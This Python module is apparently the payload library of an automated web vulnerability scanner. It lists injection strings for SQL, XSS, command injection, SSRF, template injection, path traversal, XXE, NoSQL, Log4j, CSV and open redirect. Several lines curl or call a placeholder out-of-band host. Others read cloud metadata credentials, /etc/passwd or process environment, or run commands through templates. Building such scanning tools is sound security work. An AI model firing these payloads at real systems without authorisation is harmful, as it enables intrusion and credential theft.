"""
DAST payload library.

Curated payload sets per vulnerability class. Conservative by design: payloads
are observation-oriented (do they reflect? do they break parsing? do they
delay?) rather than destructive. Real exploitation chains are constructed by
the hunter/validator/chain-builder agents using these as primitives.

All payloads are short, single-line, and free of newlines unless explicitly
testing CRLF behavior. They MUST NOT contain real production secrets, host
names, or anything that could constitute a real attack against an unrelated
target.
"""
from __future__ import annotations

# A. SQL injection — error-based, boolean-based, time-based, union-based
SQLI = [
    "'",
    "\"",
    "')",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "\" OR \"1\"=\"1",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "1) AND SLEEP(5)--",
    "1' AND SLEEP(5)--",
    "1'; WAITFOR DELAY '0:0:5'--",
    "1; SELECT pg_sleep(5)--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' AND 1=CONVERT(int,(SELECT @@version))--",
    "admin'--",
    "admin') OR '1'='1",
    "0x27",
    "\\x27",
    "/*!50000UNION*/ SELECT NULL",
    "' RLIKE 0x27",
    "' OR EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
]

# B. Reflected/stored XSS
XSS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'\"><img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "<svg onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "\"><svg/onload=alert(1)>",
    "</script><script>alert(1)</script>",
    "<img src=x onerror=alert`1`>",
    "<a href='javascript:alert(1)'>x</a>",
    "{{7*7}}",  # also a marker for SSTI confusion
    "<x onmouseover=alert(1)>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "<details/open/ontoggle=alert(1)>",
    "<style>@import'//lacuna-evil.example/x.css'</style>",
]

# C. OS command injection
CMDI = [
    "; id",
    "| id",
    "& id",
    "&& id",
    "|| id",
    "`id`",
    "$(id)",
    "`whoami`",
    "$(whoami)",
    "; sleep 5",
    "| sleep 5",
    "&& sleep 5",
    "$(sleep 5)",
    "\n id",
    "%0aid",
    "%0a%20id",
    "%26id",
    "`curl http://OOB_TOKEN.oob.local/x`",
    "$(curl http://OOB_TOKEN.oob.local/x)",
]

# D. Server-side request forgery — fill OOB_TOKEN by replace before send
SSRF = [
    "http://OOB_TOKEN.oob.local/",
    "http://OOB_TOKEN.oob.local:8080/",
    "https://OOB_TOKEN.oob.local/",
    "http://169.254.169.254/latest/meta-data/",                       # AWS IMDS
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/instance/",   # GCP
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01", # Azure
    "http://[::1]:80/",
    "http://127.0.0.1/",
    "http://0.0.0.0/",
    "http://localhost/",
    "file:///etc/passwd",
    "gopher://OOB_TOKEN.oob.local:80/_GET%20/",
    "dict://OOB_TOKEN.oob.local:11211/stats",
    "http://127.1/",
    "http://0177.0.0.1/",       # octal
    "http://2130706433/",       # decimal
    "http://OOB_TOKEN.oob.local@127.0.0.1/",
    "http://127.0.0.1#@OOB_TOKEN.oob.local/",
]

# E. Server-side template injection
SSTI = [
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "{{7*'7'}}",
    "{% debug %}",
    "{{config}}",
    "{{request.application.__globals__}}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "{{ ''.__class__.__mro__[1].__subclasses__() }}",
    "{{ self.__init__.__globals__ }}",
    "#set($x='') $x.class.forName('java.lang.Runtime')",
    "<%= system('id') %>",
    "@{T(java.lang.Runtime).getRuntime().exec('id')}",
]

# F. Path traversal
PATH_TRAVERSAL = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "....//....//etc/passwd",
    "..%2f..%2fetc%2fpasswd",
    "..%252f..%252fetc%252fpasswd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..\\..\\..\\windows\\win.ini",
    "/etc/passwd",
    "C:\\windows\\win.ini",
    "/var/log/syslog",
    "file:///etc/passwd",
    "/proc/self/environ",
    "..\u002f..\u002fetc\u002fpasswd",
]

# G. XXE
XXE = [
    "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>",
    "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"http://OOB_TOKEN.oob.local/\">]><r>&x;</r>",
    "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % p SYSTEM \"http://OOB_TOKEN.oob.local/x.dtd\">%p;]><r>x</r>",
]

# H. NoSQL injection (Mongo-style)
NOSQL = [
    "{\"$ne\": null}",
    "{\"$gt\": \"\"}",
    "{\"$regex\": \".*\"}",
    "true, $where: '1==1'",
    "[$ne]=1",
    "';return true;//",
    "1';return true;//",
]

# I. Log4j / JNDI
LOG4J = [
    "${jndi:ldap://OOB_TOKEN.oob.local/x}",
    "${jndi:dns://OOB_TOKEN.oob.local/x}",
    "${jndi:rmi://OOB_TOKEN.oob.local/x}",
    "${${lower:j}ndi:ldap://OOB_TOKEN.oob.local/x}",
    "${${::-j}${::-n}${::-d}${::-i}:ldap://OOB_TOKEN.oob.local/x}",
]

# J. CSV / spreadsheet injection
CSV_INJECTION = [
    "=1+1",
    "=HYPERLINK(\"http://OOB_TOKEN.oob.local/\",\"x\")",
    "=cmd|' /C calc'!A0",
    "@SUM(1+1)",
    "+1+1",
    "-1+1",
]

# K. Open redirect
OPEN_REDIRECT = [
    "https://lacuna-evil.example/",
    "//lacuna-evil.example/",
    "/\\lacuna-evil.example/",
    "https://lacuna-evil.example#@trusted.example/",
    "https:lacuna-evil.example",
    "javascript:alert(1)",
]


_PAYLOAD_INDEX = {
    "sqli": SQLI,
    "xss": XSS,
    "cmdi": CMDI,
    "ssrf": SSRF,
    "ssti": SSTI,
    "path-traversal": PATH_TRAVERSAL,
    "xxe": XXE,
    "nosql": NOSQL,
    "log4j": LOG4J,
    "csv-injection": CSV_INJECTION,
    "open-redirect": OPEN_REDIRECT,
}


def payloads_for_class(payload_class: str) -> list[str]:
    return _PAYLOAD_INDEX.get(payload_class.lower(), [])


def replace_oob_token(payloads: list[str], token: str) -> list[str]:
    """Replace OOB_TOKEN placeholders with an actual token."""
    return [p.replace("OOB_TOKEN", token) for p in payloads]
